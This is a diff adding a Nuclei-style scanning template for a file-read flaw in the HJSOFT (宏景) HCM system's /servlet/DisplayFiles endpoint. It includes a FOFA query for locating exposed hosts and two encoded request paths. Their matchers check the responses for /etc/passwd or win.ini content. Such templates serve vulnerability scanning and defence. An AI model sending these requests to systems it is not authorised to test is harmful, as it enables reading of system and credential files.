@@ -1,0 +1,33 @@
+id: hjsoft-servlet-DisplayFiles-fileread
+
+info:
+  name: 宏景 HCM 系统 /servlet/DisplayFiles - fileread
+  author: leadlife
+  severity: high
+  description: todo
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="HJSOFT-HCM"
+  tags: hjsoft,fileread,hcm
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/DisplayFiles?filename=11&filepath=LsNVAA8YXnv9U7EgvPAATTP2HJBPAATTPC2XDolqkE51gLe"
+      - "{{BaseURL}}/servlet/DisplayFiles?filename=11&filepath=RNcrjWtNfJnkUMbX1UB6VAPAATTP3HJDPAATTPPAATTP3HJDPAATTP"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
